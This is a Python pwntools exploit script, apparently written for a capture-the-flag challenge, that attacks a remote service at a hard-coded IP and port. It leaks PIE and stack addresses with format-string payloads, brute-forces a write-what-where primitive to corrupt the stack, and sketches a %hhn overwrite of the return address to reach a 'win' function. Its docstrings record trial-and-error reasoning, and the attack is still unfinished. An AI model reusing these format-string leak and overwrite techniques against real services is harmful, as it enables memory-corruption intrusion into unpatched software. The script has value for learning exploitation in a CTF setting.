#!/usr/bin/env python3
from pwn import *

context.arch = 'amd64'
context.log_level = 'info'

HOST = "52.59.124.14"
PORT = 5030

WIN_OFFSET = 0xdbed0
GREETING_OFFSET = 0xdc060

def exploit():
    """
    Confirmed: Position 79 contains the return address.

    The cleanup code writes 0x00 to [fake_stack + 0x1f8].
    If we can make fake_stack + 0x1f8 contain the address of the return address,
    we'll zero its low byte.

    But zeroing the low byte of return address:
    - ret = 0x??dc052 -> 0x??dc000 (zeroing low byte)
    - This doesn't point to win (0x??dbed0)

    Alternative: What if we write 0x00 to a different byte of the return address?
    - ret+1: zeroes byte 1 (0x50), ret becomes 0x??dc0052 -> different page
    - ret+2: zeroes byte 2 (0xdc), ret becomes 0x??005052 -> way off

    None of these land on win.

    NEW APPROACH: Maybe we can abuse the format string to write!
    We know position 79 has the return address VALUE.
    We control positions 10-25 (our input).

    What if we can use %79$n to write TO the address stored at position 79?
    No wait, %n writes TO an address, it doesn't write AT a position.

    Actually... %n writes the number of chars printed so far to the ADDRESS
    at that position. So %79$n would write to the ADDRESS 0x5599951c5052
    (the return address VALUE), treating it as a pointer.

    But 0x5599951c5052 is a CODE address, not writable!

    What about using %10$n where position 10 contains a stack address we control?
    We can put ret_addr_location at position 10, then use %n to write to it.

    The ret_addr_location is where position 79's value is stored.
    From the leaks:
    - Position 77: 0x7ffd49e00cd8 (stack addr)
    - Position 78: 0x7ffd49e00bc0 (stack addr)
    - Position 79: return address VALUE

    If these are consecutive 8-byte stack slots:
    - LOC_77 = X
    - LOC_78 = X + 8
    - LOC_79 = X + 16

    And if position 77's value (0x7ffd49e00cd8) is related to X somehow...

    Let me try a brute force: use the arbitrary write to write 0x00 to
    stack78 + various offsets, and see what happens.
    """
    for offset in range(-0x20, 0x20, 8):
        print(f"\nTrying offset {hex(offset)} from stack78")
        try:
            io = remote(HOST, PORT, timeout=5)
            io.recvuntil(b'Name:\n', timeout=3)

            # Leak PIE and stack78
            io.sendline(b'%8$p|%78$p')
            io.recvuntil(b"market:\n", timeout=3)
            leak = io.recvline(timeout=3).decode().strip()

            parts = leak.split('|')
            greeting = int(parts[0], 16)
            stack78 = int(parts[1], 16) if parts[1] != '(nil)' else 0

            if not stack78:
                print("  No stack78 leak, skipping")
                io.close()
                continue

            pie_base = greeting - GREETING_OFFSET
            win = pie_base + WIN_OFFSET

            # Calculate target address
            target = stack78 + offset
            print(f"  Target: {hex(target)}")

            io.recvuntil(b'slot index 0..128):\n', timeout=3)

            # Write target to fake_stack + 0x1f8
            # The cleanup will then write 0x00 to target
            slot = 19
            col = 8

            io.sendline(str(slot).encode())
            io.recvuntil(b'column offset 0..15):\n', timeout=3)
            io.sendline(str(col).encode())
            io.recvuntil(b'how many bytes to update (0..8):\n', timeout=3)
            io.sendline(b'8')
            io.recvuntil(b'Ink (raw bytes):\n', timeout=3)
            io.send(p64(target))

            output = io.recvall(timeout=2)

            if b'ENO{' in output:
                print(f"FLAG FOUND at offset {hex(offset)}!")
                print(output.decode())
                return True
            elif len(output) < 50:
                print(f"  Short output ({len(output)}B) - possible crash")
            else:
                print(f"  Normal ({len(output)}B)")

        except Exception as e:
            print(f"  Error: {e}")
        finally:
            io.close()

    return False

def fmtstr_write_exploit():
    """
    Try using format string %n to overwrite the return address.

    Strategy:
    1. Leak stack address from position 77 or 78
    2. Calculate ret_addr_location = stack78 + OFFSET
    3. Put ret_addr_location at position 10 (our input)
    4. Use %10$n (or %10$hn, %10$hhn) to write value to ret_addr_location

    The value written is "number of chars printed so far".
    To write win address (e.g., 0x55xxxxxxxxbed0), we need to print that many chars.

    This is impractical for the full address, but we can use %hhn to write
    one byte at a time:
    - Write 0xd0 to ret+0
    - Write 0xbe to ret+1
    - etc.

    This requires multiple addresses in our payload and multiple %hhn specifiers.
    """
    io = remote(HOST, PORT)
    io.recvuntil(b'Name:\n')

    # We need ~40 bytes for addresses (5 qwords), plus format specifiers
    # Total payload < 127 bytes

    # First, let's figure out the stack layout by leaking more
    payload = b'%8$p|%77$p|%78$p|%79$p'
    io.sendline(payload)

    io.recvuntil(b"market:\n")
    leak = io.recvline().decode().strip()
    print(f"Leaks: {leak}")

    parts = leak.split('|')
    greeting = int(parts[0], 16)
    stack77 = int(parts[1], 16) if parts[1] != '(nil)' else 0
    stack78 = int(parts[2], 16) if parts[2] != '(nil)' else 0
    ret_val = int(parts[3], 16) if parts[3] != '(nil)' else 0

    pie_base = greeting - GREETING_OFFSET
    win = pie_base + WIN_OFFSET
    expected_ret = pie_base + 0xdc052

    print(f"PIE base: {hex(pie_base)}")
    print(f"Win: {hex(win)}")
    print(f"Expected ret: {hex(expected_ret)}")
    print(f"Position 79 value: {hex(ret_val)}")
    print(f"Stack77: {hex(stack77)}")
    print(f"Stack78: {hex(stack78)}")

    if ret_val == expected_ret:
        print("Position 79 confirmed as return address!")

        # The key insight: position 77 and 78 are stack addresses
        # Position 79 is the return address value
        #
        # If the stack layout is: [77][78][79]
        # Then LOC_79 = LOC_77 + 16 or LOC_78 + 8
        #
        # But we don't know LOC_77 or LOC_78...
        #
        # However, position 77 VALUE might give us a hint.
        # If position 77 contains a pointer to something nearby,
        # we can calculate LOC_79 from it.

        # Let me try: the difference between stack77 and stack78
        diff = stack77 - stack78
        print(f"Diff (77-78): {hex(diff)}")

    io.recvuntil(b'slot index 0..128):\n')
    io.sendline(b'0')
    io.recvuntil(b'column offset 0..15):\n')
    io.sendline(b'0')
    io.recvuntil(b'how many bytes to update (0..8):\n')
    io.sendline(b'0')
    io.recvall(timeout=1)
    io.close()

if __name__ == '__main__':
    print("=== Format string analysis ===")
    fmtstr_write_exploit()

    print("\n=== Brute force write-what-where ===")
    exploit()
